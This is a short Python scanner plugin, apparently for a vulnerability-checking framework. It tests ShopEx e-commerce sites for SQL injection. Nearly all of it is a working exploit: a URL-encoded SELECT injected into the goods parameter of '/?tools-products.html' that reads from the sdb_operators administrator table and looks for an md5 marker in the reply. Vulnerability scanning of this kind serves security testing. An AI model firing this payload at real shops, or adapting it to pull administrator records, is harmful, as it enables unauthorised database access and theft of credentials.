#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'xfkxfk'

def assign(service, arg):
    if service == "shopex":
        return True, arg

def audit(arg):
    url = arg
    code, head, body, _, _ = curl.curl('-d goods%3D1%2C2%22%29%20rank%2C%28SELECT%20concat%280x23%2Cmd5%283.1415%29%2C0x23%29%20FROM%20sdb_operators%20limit%200%2C1%29%20as%20goods_id%2Cimage_default%2Cthumbnail_pic%2Cbrief%2Cpdt_desc%2Cmktprice%2Cbig_pic%20FROM%20sdb_goods%20limit%200%2C1%20%23 ' + url + '/?tools-products.html')
    if code == 200:
        if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
            security_hole(url + '/?tools-products.html')

if __name__ == '__main__':
    from dummy import *
    audit(assign('shopex', 'http://www.example.com/')[1])